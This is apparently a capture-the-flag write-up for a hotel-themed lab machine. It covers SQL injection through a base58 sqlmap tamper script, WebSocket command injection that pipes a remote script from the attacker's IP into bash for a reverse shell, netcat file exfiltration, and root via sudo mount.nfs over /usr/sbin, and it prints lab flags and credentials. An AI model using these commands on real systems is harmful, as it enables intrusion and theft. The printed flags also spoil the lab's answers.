
# PORT SCAN
---


| PORT | SERVICE |
| :--- | :------ |
| 80 | HTTP |
| 4346 | HTTP |



# RECONNAISSANCE
---

If we check the web application at port 80, we can find this:


![Pasted image 20250702155653.png](../../IMAGES/Pasted%20image%2020250702155653.png)

We got some utilities, if we try booking a room, this happens:


![Pasted image 20250702155725.png](../../IMAGES/Pasted%20image%2020250702155725.png)



We get an alert saying the hotel is currently fully booked, that's weird, let's check other functionalities:

![Pasted image 20250702161606.png](../../IMAGES/Pasted%20image%2020250702161606.png)


![Pasted image 20250702161616.png](../../IMAGES/Pasted%20image%2020250702161616.png)

Let's check the other port:

![Pasted image 20250702164915.png](../../IMAGES/Pasted%20image%2020250702164915.png)

Nothing we can do yet, no credentials. Our best chance is the other web application.

Ok, we got some info, if we check source code, we can find this:


![Pasted image 20250702161710.png](../../IMAGES/Pasted%20image%2020250702161710.png)

There's a call to `check-rooms.js`:

![Pasted image 20250702161728.png](../../IMAGES/Pasted%20image%2020250702161728.png)

The script pulls in the current room count from `/api/rooms-available`, turns on the #booking button, and then wires up its click handler: if fewer than 6 rooms are reported it sends you straight to `new-booking`, otherwise it pops up an alert saying the hotel's fully booked.

Let's interact with the API: 

```bash
curl -s -X GET http://10.10.129.203/api/rooms-available
6
```

Not much we can do with it, we can check `new-booking` though:

![Pasted image 20250702162514.png](../../IMAGES/Pasted%20image%2020250702162514.png)



![Pasted image 20250702162458.png](../../IMAGES/Pasted%20image%2020250702162458.png)



![Pasted image 20250702162544.png](../../IMAGES/Pasted%20image%2020250702162544.png)

This script defines a `getCookie` helper to extract a named cookie's value, then uses it to retrieve the `BOOKING_KEY` from `document.cookie`. It sends a GET request to `/api/booking-info?booking_key=<key>`, parses the JSON response, and auto‘fills the form fields `#rooms` with `data.room_num` and `#nights` with `data.days`, effectively pre‘populating the booking form based on the stored booking key.

As seen, we can notice the `BOOKING_KEY` cookie on our browser:

![Pasted image 20250702162749.png](../../IMAGES/Pasted%20image%2020250702162749.png)

This is base58 encoding, if we use cyberchef, we can notice this:

![Pasted image 20250702162847.png](../../IMAGES/Pasted%20image%2020250702162847.png)

We got:

```
booking_id:9148112
```

Let's interact with the API, for now, we can begin exploitation phase.


# EXPLOITATION
---

We can interact with the API using curl or a proxy, I'll use caido:


![Pasted image 20250702163137.png](../../IMAGES/Pasted%20image%2020250702163137.png)

It says not found, let's try sending another stuff as the key, maybe `LFI` or `SQLI` works, even `SSRF`:

![Pasted image 20250702163549.png](../../IMAGES/Pasted%20image%2020250702163549.png)

![Pasted image 20250702163351.png](../../IMAGES/Pasted%20image%2020250702163351.png)

LFI doesn't work here, I tried some payloads but no luck, let's try `SQLI`:

![Pasted image 20250702163611.png](../../IMAGES/Pasted%20image%2020250702163611.png)


![Pasted image 20250702163714.png](../../IMAGES/Pasted%20image%2020250702163714.png)

No bad request so it may work, let's try to enumerate the number of rows by using `order by`:

![Pasted image 20250702163810.png](../../IMAGES/Pasted%20image%2020250702163810.png)

![Pasted image 20250702163858.png](../../IMAGES/Pasted%20image%2020250702163858.png)

![Pasted image 20250702163911.png](../../IMAGES/Pasted%20image%2020250702163911.png)

On `3` we get a bad request, which means that SQLI is possible, we can automate the process with `sqlmap` but we need a tamper, a tamper is a little Python hook that sits between the tool and the target, grabbing every injection payload sqlmap generates and transforming it before it's sent. we need it thanks to the `base58` format, let's use this script:

```python
from lib.core.enums import PRIORITY
import base58

__priority__ = PRIORITY.HIGHEST

def tamper(payload, **kwargs):
 """
 Encode the payload with base58 :)
 """
 if payload:
 prefixed_payload = f"booking_id:{payload}"
 encoded_payload = base58.b58encode(prefixed_payload.encode()).decode()
 return encoded_payload
 return payload
```

Now, we need to create a tamper.py file with those contents and an `__init__.py` file too, once we do it, we can send the following `sqlmap` command:

```bash
sqlmap -u "http://IP/api/booking-info?booking_key=" -p "booking_key" --tamper=PATH TO TAMPER.PY/tamper.py --dbms=sqlite --technique=U --string="not found" --random-agent --level=5 --risk=3 --dump -batch
```


Make sure you got `base58` on pip before using the command:

```
pip install base58
```

We can see this:

![Pasted image 20250702164805.png](../../IMAGES/Pasted%20image%2020250702164805.png)


There are some credentials:

```
pdenton:4321chameleon
```

We can use them on the 4346 port web application:


![Pasted image 20250702165049.png](../../IMAGES/Pasted%20image%2020250702165049.png)


There's a message from `SweetCharity` to our user, we can see this on the source code:

![Pasted image 20250702165158.png](../../IMAGES/Pasted%20image%2020250702165158.png)

There's a `js` script embedded, let's beautify it:

```js
let elems = document.querySelectorAll(".email_list .row");
for (var i = 0; i < elems.length; i++) {
 elems[i].addEventListener("click", (e => {
 document.querySelector(".email_list .selected").classList.remove("selected"), e.target.parentElement.classList.add("selected");
 let t = e.target.parentElement.getAttribute("data-id"),
 n = e.target.parentElement.querySelector(".col_from").innerText,
 r = e.target.parentElement.querySelector(".col_subject").innerText;
 document.querySelector("#from_header").innerText = n, document.querySelector("#subj_header").innerText = r, document.querySelector("#email_content").innerText = "", fetch("/api/message?message_id=" + t).then((e => e.text())).then((e => {
 document.querySelector("#email_content").innerText = atob(e)
 }))
 })), document.querySelector(".dialog_controls button").addEventListener("click", (e => {
 e.preventDefault(), window.location.href = "/"
 }))
}
const wsUri = `ws://${location.host}/ws`;
socket = new WebSocket(wsUri);
let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
socket.onmessage = e => document.querySelector(".time").innerText = e.data, setInterval((() => socket.send(tz)), 1e3);
```

This snippet first grabs every row in the .email_list and wires up a click handler so that when a row is clicked it: 

1) removes the selected class from whatever was highlighted and adds it to the clicked row, 
2) pulls out that row's `data-id`, sender name, and subject text, 
3) updates the headers on the page, and 
4) does a GET to `/api/message?message_id=<id>`, reads the plain‘text (which is Base64‘encoded), decodes it with `atob()`, and dumps it into the message body area. It also hooks a back button to redirect to / and opens a WebSocket to `ws://<host>/ws`, sending the browser's time zone string every second and updating a .time element with whatever the server pushes back.


Due to the format of `/message?message_id=id`, we may be able to fuzz, let's automate the process on Caido:


![Pasted image 20250702165550.png](../../IMAGES/Pasted%20image%2020250702165550.png)

![Pasted image 20250702165616.png](../../IMAGES/Pasted%20image%2020250702165616.png)

5 messages got `200` status code, let's check them:

```
From: KVORK, Inc.//NYCNET.89.09.64.53
To: Multiple Recipients
Subject: SPAM: Tired of life?

Hello Friend,

Has life become too impersonal, too tedius, too painful for you? Then now is
the time to exert control, to make that decision which is ultimately the only
real choice we ever have: the decision to die.

Some may describe this as an act of selfishness, but with the dwindling
reserves of natural resources throughout the world you're actually
contributing to the well-being of all those around you. A recent bill passed
by the United States Congress even authorizes a one-time payment of c10,000 to
your chosen benefactor upon passing away.

So do yourself, your family, and your friends a favor and visit any one of the
KVORK, Inc. clinics in a neighborhood near you. We'll help you make a
difference - quickly and quietly.

Sincerely,

Derek Schmitt
Director of Development, KVORK, inc.
```

```
From: JReyes//UNATCO.00973.20892
To: Paul Denton//NYCNET.33.34.4346
Subject: Settled in yet?

Hey JC,

Thought I'd help you unload your boxes, but I'm tied down trying to get one of
the medical analyzers working. Damn thing nearly lasered off one of my fingers!
Catch you later for a beer maybe?

Oh, and here's a flag: thm{adb5b797ee0d01a8c052dbee46fbc065e8c52afd}

Jaime
```

```
Your message:

To: juan//NYCNET.7786.786658
Subject: Your Results
Sent: Wed 14:18:59 -0600

Did not reach the following recipient(s):

juan//HK2net.7786.786658 on Wed, 14:26:35 -0600
Unable to deliver message due to a communications failure
MPSEXCH:IMS: New York Net: BORONTYPE:ADA 0 (000C05A6) Unknown Recipient

Message as follows:

>I'm definitely worried about the test results; there are
>some implications there that I'm afraid to pursue too
>much further. I'll talk to Tracer. Proceed with caution.
>
>-P
```

```
From: ClassicMovies.pcx3345:ABS
To: Paul Denton//NYCNET.33.34.4346
Subject: Account Verification

Mr. Denton:

We've recieved your order for "Blue Harvest" and "See You Next Wednesday." At
your earliest possible convenience, please remit c110 at which point they will
be shipped immediately.

 Thanks for your business,

 Marcy Plaigrond
 Vibrant Videos, Inc.
```

That's all we can find for the id fuzzing part, if we remember the script opens a `websocket`, we can manipulate this WebSocket to execute commands let's use burp on this case for `websocket` manipulation:

![Pasted image 20250702173041.png](../../IMAGES/Pasted%20image%2020250702173041.png)

If we test a simple `command injection`, we get this:

```
UTC;id;
```
![Pasted image 20250702173113.png](../../IMAGES/Pasted%20image%2020250702173113.png)

This means that command injection is possible, so, getting a shell is possible too, in order to get a shell, we can use `busybox` or create a `index.html` file with a python reverse shell:

![Pasted image 20250702172303.png](../../IMAGES/Pasted%20image%2020250702172303.png)

Now, we need to host it using a python server and use curl to get the file, once the file downloads, we need to use bash to execute it, we can do all this with the following command:

```
UTC;curl 10.14.21.28|bash;
```

>Note: Make sure to use only ports `80` and `443` because the server is only able to reach us on those ports.

Once we send it, this happens:

![Pasted image 20250702173230.png](../../IMAGES/Pasted%20image%2020250702173230.png)

We get a shell as seen, let's proceed with privilege escalation.


# PRIVILEGE ESCALATION
---


First of all, we need to stabilize our shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250702173353.png](../../IMAGES/Pasted%20image%2020250702173353.png)


We got some users on here:

```bash
gilbert@tonhotel:/home$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:112:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_rpc:x:113:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:114:65534::/var/lib/nfs:/usr/sbin/nologin
gilbert:x:1001:1001::/home/gilbert:/bin/sh
sandra:x:1002:1002::/home/sandra:/bin/sh
jojo:x:1003:1003::/home/jojo:/bin/sh

gilbert@tonhotel:/home$ ls -la
total 20
drwxr-xr-x 5 root root 4096 Sep 10 2023 .
drwxr-xr-x 19 root root 4096 Oct 22 2022 ..
drwxr-xr-x 2 gilbert gilbert 4096 Sep 10 2023 gilbert
drwxr-xr-x 2 jojo jojo 4096 Sep 10 2023 jojo
drwxr-xr-x 3 sandra sandra 4096 Sep 10 2023 sandra
```

We got some users:

```
gilbert@tonhotel:/home$ ls -la jojo
total 24
drwxr-xr-x 2 jojo jojo 4096 Sep 10 2023 .
drwxr-xr-x 5 root root 4096 Sep 10 2023 ..
lrwxrwxrwx 1 jojo jojo 9 Sep 10 2023 .bash_history -> /dev/null
-rw-r--r-- 1 jojo jojo 220 Feb 25 2020 .bash_logout
-rw-r--r-- 1 jojo jojo 3771 Feb 25 2020 .bashrc
-rw-rw---- 1 jojo jojo 223 Sep 10 2023 note.txt
-rw-r--r-- 1 jojo jojo 807 Feb 25 2020 .profile
gilbert@tonhotel:/home$ ls -la sandra
total 32
drwxr-xr-x 3 sandra sandra 4096 Sep 10 2023 .
drwxr-xr-x 5 root root 4096 Sep 10 2023 ..
lrwxrwxrwx 1 sandra sandra 9 Sep 10 2023 .bash_history -> /dev/null
-rw-r--r-- 1 sandra sandra 220 Feb 25 2020 .bash_logout
-rw-r--r-- 1 sandra sandra 3771 Feb 25 2020 .bashrc
-rw-rw---- 1 sandra sandra 198 Sep 10 2023 note.txt
drwxrwx--- 2 sandra sandra 4096 Sep 10 2023 Pictures
-rw-r--r-- 1 sandra sandra 807 Feb 25 2020 .profile
-rw-rw---- 1 sandra sandra 46 Sep 10 2023 user.txt
gilbert@tonhotel:/home$ ls -la gilbert
total 28
drwxr-xr-x 2 gilbert gilbert 4096 Sep 10 2023 .
drwxr-xr-x 5 root root 4096 Sep 10 2023 ..
lrwxrwxrwx 1 gilbert gilbert 9 Sep 10 2023 .bash_history -> /dev/null
-rw-r--r-- 1 gilbert gilbert 220 Feb 25 2020 .bash_logout
-rw-r--r-- 1 gilbert gilbert 3771 Feb 25 2020 .bashrc
-rw-r----- 1 sandra gilbert 31 Sep 10 2023 dad.txt
-rw-rw---- 1 gilbert gilbert 461 Sep 10 2023 hotel-jobs.txt
-rw-r--r-- 1 gilbert gilbert 807 Feb 25 2020 .profile
```

Let's check our notes:

```bash
gilbert@tonhotel:/home$ cat /home/gilbert/dad.txt
left you a note by the site -S

gilbert@tonhotel:/home$ cat /home/gilbert/hotel-jobs.txt
hotel tasks, q1 52

- fix lights in the elevator shaft, flickering for a while now
- maybe put barrier up in front of shaft, so the addicts dont fall in
- ask sandra AGAIN why that punk has an account on here (be nice, so good for her to be home helping with admin)
- remember! 'ilovemydaughter'

buy her something special maybe - she used to like raspberry candy - as thanks for locking the machine down. 'ports are blocked' whatever that means. my smart girl
```


That may be the password for `sandra`, let's try to switch:

```
sandra:ilovemydaughter
```

```
gilbert@tonhotel:/home$ su sandra
Password:
su: Authentication failure
```

No luck, let's keep on looking, we can get linpeas on the machine using a simple trick, since we know that we only can use ports `80` and `443`, we can do this:

```python
cp linpeas.sh index.html
sudo python3 -m http.server 80
wget http://IP/index.html
mv index.html linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Once we run linpeas, we can find a `/srv` directory which contains a `/srv/.dad` file:

```
gilbert@tonhotel:/tmp$ cat /srv/.dad
i cant deal with your attacks on my friends rn dad, i need to take some time away from the hotel. if you need access to the ton site, my pw is where id rather be: anywherebuthere. -S
```

This is the password for `Sandra:`

```
sandra:anywherebuthere
```

![Pasted image 20250702181202.png](../../IMAGES/Pasted%20image%2020250702181202.png)

Let's run `linpeas` again, once we run it, we can find a `boss.jpg` file on the `Pictures` directory of our home:

```
sandra@tonhotel:/tmp$ ls -la /home/sandra/Pictures/
total 40
drwxrwx--- 2 sandra sandra 4096 Sep 10 2023 .
drwxr-xr-x 5 sandra sandra 4096 Jul 2 23:13 ..
-rw-rw---- 1 sandra sandra 32637 Sep 7 2023 boss.jpg
```

Let's get it on our machine, we can use netcat for it:

```
# On our machine

sudo nc -lvnp 80 > boss.jpg

# On reverse shell

nc VPN_IP 80 < /home/sandra/Pictures/boss.jpg 
```

We can see this on the picture:

![Pasted image 20250702182020.png](../../IMAGES/Pasted%20image%2020250702182020.png)

We got credentials for `jojo`:

```
jojo:kingofhellskitchen
```

![Pasted image 20250702182056.png](../../IMAGES/Pasted%20image%2020250702182056.png)

If we check our sudo permissions, we notice this:

```
jojo@tonhotel:/tmp$ sudo -l
[sudo] password for jojo:
Matching Defaults entries for jojo on tonhotel:
 env_reset, mail_badpass,
 secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jojo may run the following commands on tonhotel:
 (root) /usr/sbin/mount.nfs
```


This allow us to mount a `NFS` share, by doing this, we can achieve root, we will basically mount a writable `NFS` over `/usr/sbin` and replace the `mount.nfs` file, on this way, we can achieve root, let's do it:

We need to install `nfs-kernel-server` and enable it:

```bash
sudo apt install -y nfs-kernel-server
sudo systemctl enable --now rpcbind nfs-server
```

First, let's create a directory on our vm:

```
mkdir /tmp/share
sudo chown nobody:nogroup /tmp/share
sudo chmod 777 /tmp/share
```

Now, modify `/etc/nfs.conf` with:

```
[nfsd]
port=443
```

![Pasted image 20250702190016.png](../../IMAGES/Pasted%20image%2020250702190016.png)


We need to modify `/etc/exports` with:

```
/tmp/share *(rw,sync,no_subtree_check)
```

![Pasted image 20250702185446.png](../../IMAGES/Pasted%20image%2020250702185446.png)

Now, let's restart the service:

```
sudo exportfs -a

sudo systemctl restart nfs-kernel-server
```

We can now attempt to connect using sudo on the machine:

```
sudo /usr/sbin/mount.nfs -o port=443 10.14.21.28:/tmp/share /usr/sbin
```

If we check `/usr/sbin`, we can now realize it is writable:

```
jojo@tonhotel:/$ ls -la /usr/sbin
total 4
drwxrwxrwx 2 nobody nogroup 40 Jul 2 23:49 .
drwxr-xr-x 14 root root 4096 Aug 31 2022 ..
```

![Pasted image 20250702190134.png](../../IMAGES/Pasted%20image%2020250702190134.png)

We can simply replace `/usr/sbin/mount.nfs` with `/bin/bash`:

```
cp /bin/bash /usr/sbin/mount.nfs

jojo@tonhotel:/$ ls -la /usr/sbin
total 1160
drwxrwxrwx 2 nobody nogroup 60 Jul 3 00:01 .
drwxr-xr-x 14 root root 4096 Aug 31 2022 ..
-rwxr-xr-x 1 jojo jojo 1183448 Jul 3 00:01 mount.nfs
```

Now, let's use sudo to get our shell:

```
jojo@tonhotel:/$ sudo /usr/sbin/mount.nfs
root@tonhotel:/# whoami
root
```

![Pasted image 20250702190338.png](../../IMAGES/Pasted%20image%2020250702190338.png)

There we go, let's get both flags and end the CTF:

```
root@tonhotel:/# cat /home/sandra/user.txt
thm{5b23d1881ee6a6cfac85866b9a4ff941ecd2fa3e}

root@tonhotel:/# cat /root/root.txt
thm{7f6b4d8aee9e1677a0db343ace5fff23fc5b5d3b}
```


![Pasted image 20250702190453.png](../../IMAGES/Pasted%20image%2020250702190453.png)


